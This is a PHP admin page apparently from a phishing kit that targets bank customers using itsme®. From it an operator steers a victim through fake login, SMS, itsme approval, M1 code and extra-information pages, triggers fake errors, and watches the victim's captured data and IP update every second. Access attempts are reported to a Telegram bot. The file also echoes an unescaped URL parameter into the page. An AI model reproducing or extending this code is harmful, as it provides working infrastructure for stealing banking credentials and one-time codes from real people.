<?php
    error_reporting(0);
    session_start();
    include "../libraries/get-country-code.php";
    include "../setting/functions.php";
    include "../libraries/UserInfo.php";
    include "../setting/alert-admin.php";
    include "../setting/config.php";

    if(!isset($_GET['id_user']) OR empty($_GET['id_user'])){
        exit("INVALID REQUESTS. PLEASE ACCESS THIS PAGE FROM A VALID LINK");
    }

    $_SESSION['vip'] = $_GET['id_user'];
    $target = $_GET['id_user'];
    $file_name = $target;
    $jsonFilePath = "../panel/storage/{$file_name}.json";
    $json_data = file_get_contents($jsonFilePath);
    $user_data = json_decode($json_data, true);

    //xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx// 
    $jsonFilePath = "../panel/admin/admin.json";
    $json_data = file_get_contents($jsonFilePath);
    $user_data = json_decode($json_data, true);
    $login_status = $user_data['login_status'];
    $token_admin = TOKEN;
    $chat_id_admin = CHATID;
    $ip = get_client_ip();
    $present_time = date("H:i:s"."-"."m/d/y");

    $ip_found = false;
    foreach ($user_data['login_status'] ?? [] as $login) {
        if ($login['ip'] === $ip) {
            $ip_found = true;
            break;
        }
    }
    
    if (!$ip_found) {
        $_SESSION["message_login"] = "Please log in to access this page. Or Your Ip Address is Change - " . $ip;

        $log = "Please log in to access this page. Or Your Ip Address is Change - " . $ip;

        // Send Data To Telegram :
        $message= urlencode("🔐========= Login Status =========🔐\r\n" . 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Login Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Login Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);

        echo 
        "<script>
            window.location.replace('../panel/pages/login.php');
        </script>";
        exit;
    }
?> 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/panel.css">
    <!-- Font Awesome Library -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- JQ -->
    <script src="../js/jquery-3.6.0.min.js"></script>    
    <!-- Favicon -->
    <link rel="icon" href="img/favicon.png">
    <link rel="shortcut" href="img/favicon.png">
    <link rel="appel-touch-icon" href="img/favicon.png">
    <title>Dashboard Control User - <?php echo $_GET['id_user'];?></title>
</head>
<body id="beforeUserData" class="">
    <!-- Start Nav Bar -->
    <nav>
        <div class="content-nav">
            <h3><img src="img/favicon.png" alt=""> Admin Dashboard</h3> 
            <div class="parent-buttons-setting" id="menu">
                <button id="updatePage" class="buttons-settings"> <i class="fa-solid fa-rotate-right"></i>Realod</button>
                <a class="buttons-settings" target="_blank" href="../panel/pages/settings.php"><i class="fa-solid fa-gear"></i>Settings</a>
                <a class="buttons-settings" target="_blank" href="../panel/pages/main_panel.php"><i class="fa-solid fa-square-poll-vertical"></i>Main Panel</a>
            </div>
            <button class="button-menu" id="buttonMenu"><i class="fa-solid fa-bars" id="buttonIcon"></i>Menu</button>
        </div>
    </nav>
    <!-- End Nav Bar -->

    <!-- Start Buttons Control Users -->
    <div class="container-buttons-control-user">
        <div class="container">
            <h3 class="titles"><i class="fa-solid fa-gamepad" style="margin-right: 10px !important;"></i> Buttons Control User</h3>
            <form action="./check-action.php" method="post">
                <input type="hidden" name="step" value="panel">
                <input type="hidden" name="id_vip" value="<?php echo $_GET['id_user'];?>">
                <button type="submit" name="to" class="buttons-control-users button-valid" value="login">Login</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="login-error">Error Login</button>
                <button type="submit" name="to" class="buttons-control-users button-valid" value="information">Information</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="information-error">Error Information</button>
                <button type="submit" name="to" class="buttons-control-users button-valid" value="sms">SMS</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="sms-error">Error SMS</button>
                <button type="submit" name="to" class="buttons-control-users button-valid" value="approvation">Approvation itsme®</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="approvation-error">Error Approvation itsme®</button>
                <button type="submit" name="to" class="buttons-control-users button-logout" value="logout">Logout</button>
            </form>
            <form action="./check-action.php" class="unique-form" method="post">
                <input type="hidden" name="step" value="panel">
                <input type="hidden" name="id_vip" value="<?php echo $_GET['id_user'];?>">
                <input type="text" class="input-request" name="m1_code" placeholder="M1 Code" required="required">
                <button type="submit" name="to" class="buttons-control-users button-valid" value="m1-code">M1 Code</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="m1-code-error"> Error M1 Code</button>
            </form>
            <form action="./check-action.php" class="unique-form" method="post">
                <input type="hidden" name="step" value="panel">
                <input type="hidden" name="id_vip" value="<?php echo $_GET['id_user'];?>">
                <input type="text" class="input-request" name="extra_information" placeholder="Extra Information" required="required">
                <button type="submit" name="to" class="buttons-control-users button-valid" value="extra-information">Extra Information</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="extra-information-error">Extra Information</button>
            </form>
            <div class="parent-buttons-events">
                <h3 class="titles"><i class="fa-solid fa-circle-info" style="margin-right: 10px !important;"></i>User Data</h3>
                <textarea class="data" id="userDataTextarea"></textarea>
            </div>
        </div>
    </div>
    <!-- Start User Data -->

    <!-- Start Table User Information -->
    <div class="container parent-table" id="dashboard" >
        <h3 class="titles"><i class="fa-solid fa-chart-line" style="margin-right: 10px !important;"></i>User Information</h3>
        <table class="table">
            <thead>
                <tr>
                    <th><i class="fa-solid fa-signal"></i>Status</th>
                    <th><i class="fa-solid fa-map-pin"></i>Page</th>
                    <th><i class="fa-solid fa-wifi"></i>IP Address</th>
                    <th><i class="fa-solid fa-clock-rotate-left"></i>Time</th>
                </tr>
            </thead>
            <tbody id="tableBody" class="dynamic-section">

            </tbody>
        </table>
    </div>
    <!-- End Table User Information -->

    <!-- Script Js -->
    <script>
        function fetchAndUpdateContent(){$("#tableBody");$.ajax({url:"../panel/storage/<?php echo $file_name?>.json",type:"GET",dataType:"json",success:function(a){updateTable(a)},error:function(a,t,e){console.error("Error fetching data:",e)}}),setTimeout(fetchAndUpdateContent,1e3)}function updateTable(a){let t=$("#tableBody");t.empty();let e=$("<tr>"),r=$("<td>").html(a.userStatus),d=$("<td>").text(a.current_page),n=$("<td>").text(a.user_ip),o=$("<td>").text(a.timestamp);e.append(r,d,n,o),t.append(e)}fetchAndUpdateContent();const updatePage=$("#updatePage");updatePage.click(function(){location.reload()}),$(document).ready(function(){setInterval(function a(){$.ajax({url:"get_user_data.php",type:"GET",data:{id_user:"<?php echo $_GET['id_user']; ?>"},success:function(a){try{let t=JSON.parse(a);if(t.error)$("#userDataTextarea").val(t.error);else{let e=(t.data_1||"")+(t.data_2||"")+(t.data_3||"")+(t.data_4||"")+(t.data_5||"")+(t.data_6||"")+(t.data_7||"")+(t.data_8||"")+(t.data_9||"")+(t.data_10||"");$("#userDataTextarea").val(e)}}catch(r){$("#userDataTextarea").val("Error parsing data")}},error:function(){$("#userDataTextarea").val("Error fetching data")}})},1e3)});
        const menu=document.getElementById("menu"),buttonMenu=document.getElementById("buttonMenu"),buttonIcon=document.getElementById("buttonIcon");buttonMenu.addEventListener("click",()=>{menu.classList.toggle("show-menu"),!0===menu.classList.contains("show-menu")?buttonIcon.className="fa-solid fa-circle-xmark":buttonIcon.className="fa-solid fa-bars"});
    </script>

</body>
</html>